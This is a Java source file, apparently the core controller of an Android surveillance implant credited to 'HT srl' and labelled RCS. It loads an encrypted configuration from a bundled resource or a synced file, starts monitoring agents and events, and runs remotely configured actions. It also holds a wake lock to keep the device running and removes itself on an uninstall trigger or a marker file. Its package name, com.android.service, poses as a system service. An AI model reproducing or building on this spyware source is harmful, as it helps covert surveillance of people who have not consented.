/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.res.Resources;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

import com.android.service.action.Action;
import com.android.service.action.SubAction;
import com.android.service.action.UninstallAction;
import com.android.service.agent.AgentManager;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfType;
import com.android.service.conf.Configuration;
import com.android.service.event.EventManager;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.Markup;
import com.android.service.file.AutoFile;
import com.android.service.file.Path;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class Core, represents
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core"; //$NON-NLS-1$

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The resources. */
	private Resources resources;

	/** The core thread. */
	private Thread coreThread;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private AgentManager agentManager;

	/** The event manager. */
	private EventManager eventManager;
	private WakeLock wl;

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */
	public boolean Start(final Resources r, final ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		if (Cfg.DEBUG) {
			Check.asserts(resources != null, "Null Resources"); //$NON-NLS-1$
		}

		try {
			coreThread.start();
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		// mRedrawHandler.sleep(1000);

		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
		wl.acquire();

		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;
		stopAll();
		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
		}
		wl.release();
		return true;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
		}

		try {
			while (!bStopCore) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: init task"); //$NON-NLS-1$
				}

				int confLoaded = taskInit();
				// viene letta la conf e vengono fatti partire agenti e eventi
				if (confLoaded == ConfType.Error) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
					}
					break;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
					}
				}

				// Status.self().setRestarting(false);
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
				}

				if (checkActions() == Exit.RELOAD) { //$NON-NLS-1$
					if (Cfg.DEBUG) {
						Check.log(TAG + " Info: Waiting a while before reloading"); //$NON-NLS-1$
					}
					// questa stopAll viene lanciata prima del prossimo taskInit
					stopAll();
					Utils.sleep(2000);
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Error: CheckActions() wants to exit"); //$NON-NLS-1$
					}
					// chiudere tutti i thread
					break;
				}
			}
			stopAll();
		} catch (final Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
			}
		} finally {
			if (Cfg.DEBUG) {
				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
			}
			Utils.sleep(1000);

			System.runFinalizersOnExit(true);
			finish();
			// System.exit(0);
		}
	}

	private void stopAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");
		}
		final Status status = Status.self();
		// status.setRestarting(true);
		if (Cfg.DEBUG) {
			Check.log(TAG + " Warn: " + "checkActions: reloading"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		status.unTriggerAll();
		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
		}
		agentManager.stopAll();
		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
		}
		eventManager.stopAll();
		Utils.sleep(2000);
		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
		}
		status.unTriggerAll();

		final LogDispatcher logDispatcher = LogDispatcher.self();
		if (!logDispatcher.isAlive()) {
			logDispatcher.waitOnEmptyQueue();
			logDispatcher.halt();
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if successful
	 */
	private Exit checkActions() {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " checkActions"); //$NON-NLS-1$
				}
				final int[] actionIds = status.getTriggeredActions();

				for (final int actionId : actionIds) {
					final Action action = status.getAction(actionId);
					final Exit exitValue = executeAction(action);

					if (exitValue == Exit.UNINSTALL) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
						}
						UninstallAction.actualExecute();

						return exitValue;
					} else if (exitValue == Exit.RELOAD) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " checkActions: want Reload"); //$NON-NLS-1$
						}

						return exitValue;
					}
				}
			}

			return Exit.STOP;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
			}

			return Exit.ERROR;
		}
	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private int taskInit() {
		try {
			Path.makeDirs();

			final Markup markup = new Markup(0);
			if (markup.isMarkup()) {
				UninstallAction.actualExecute();
				return ConfType.Error;
			}

			// Identify the device uniquely
			final Device device = Device.self();
			int ret = loadConf();
			if (ret == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
				}
				return ConfType.Error;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread
			if (eventManager.startAll() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
				}
				return ConfType.Error;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
			}

			if (agentManager.startAll() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$
				}
				return ConfType.Error;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
			}

			return ret;

		} catch (final GeneralException rcse) {
			if (Cfg.DEBUG) {
				Check.log(rcse);//$NON-NLS-1$
				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
			}

		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " Exception() detected"); //$NON-NLS-1$
			}
		}

		return ConfType.Error;

	}

	public boolean verifyNewConf() {
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
		boolean loaded = false;
		if (file.exists()) {
			loaded = loadConfFile(file, false);
		}

		return loaded;
	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public int loadConf() throws GeneralException {
		boolean loaded = false;

		int ret = ConfType.Error;
		// tries to load the file got from the sync, if any.
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);

		if (file.exists()) {
			loaded = loadConfFile(file, true);

			if (!loaded) {
				Evidence.info(Messages.getString("30.2")); //$NON-NLS-1$
				file.delete();
			} else {
				Evidence.info(Messages.getString("30.3")); //$NON-NLS-1$
				file.rename(Path.conf() + ConfType.ActualConf);
				ret = ConfType.NewConf;
			}
		}

		// get the actual configuration
		if (!loaded) {
			file = new AutoFile(Path.conf() + ConfType.ActualConf);
			if (file.exists()) {
				loaded = loadConfFile(file, true);
				if (!loaded) {
					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
				} else {
					ret = ConfType.ActualConf;
				}
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.loadConfiguration(true);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
			}

			if (loaded) {
				ret = ConfType.ResourceConf;
			}
		}

		return ret;
	}

	private boolean loadConfFile(AutoFile file, boolean instantiate) {
		boolean loaded = false;
		try {
			final byte[] resource = file.read(8);
			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.loadConfiguration(instantiate);
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
			}

		} catch (GeneralException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConfFile) Error: " + e);
			}
		}
		return loaded;
	}

	/**
	 * Execute action. (Questa non viene decompilata correttamente.)
	 * 
	 * @param action
	 *            the action
	 * @return the int
	 */
	private Exit executeAction(final Action action) {
		Exit exit = Exit.SUCCESS;

		if (Cfg.DEBUG) {
			Check.log(TAG + " CheckActions() triggered: " + action); //$NON-NLS-1$
		}
		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();
		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		int i = 1;
		for (final SubAction subAction : action.getSubActions()) {
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ action);
				}

				subAction.prepareExecute();
				final boolean ret = subAction.execute();

				if (status.uninstall) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
					}

					UninstallAction.actualExecute();

					exit = Exit.UNINSTALL;
					break;

				}

				if (status.reload) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (CheckActions): reloading"); //$NON-NLS-1$
					}

					exit = Exit.RELOAD;
					status.reload = false;
					break;
				}

				if (ret == false) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: " + "CheckActions() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
					}

					continue;
				}
			} catch (final Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: checkActions for: " + ex); //$NON-NLS-1$
				}
			}
		}

		return exit;
	}

	static Core instance;

	public synchronized static Core getInstance() {
		if (instance == null) {
			instance = new Core();
		}

		return instance;
	}

	private void Core() {

	}

	public synchronized boolean reloadConf() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (reloadConf): START");
		}

		if (verifyNewConf()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): valid conf");
			}
			stopAll();
			int ret = taskInit();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): END");
			}
			return ret != ConfType.Error;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): invalid conf");
			}
			return false;
		}
	}

}
